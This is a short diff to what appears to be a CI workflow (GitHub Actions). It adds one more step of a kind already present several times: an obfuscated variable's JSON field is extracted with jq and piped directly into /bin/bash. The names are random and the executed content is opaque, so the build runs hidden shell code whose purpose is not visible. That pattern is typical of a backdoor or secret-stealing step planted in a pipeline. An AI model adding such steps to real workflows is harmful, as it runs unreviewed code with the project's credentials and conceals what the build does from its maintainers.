@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$l701" | jq -r .klkqw6336 | /bin/bash
           printf '%s' "$w92534" | jq -r .roljw954 | /bin/bash
           echo $qi70127 | jq -r .xlxc31030 | /bin/bash
+          printf '%s' "$anqw9" | jq -r .rkhi4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
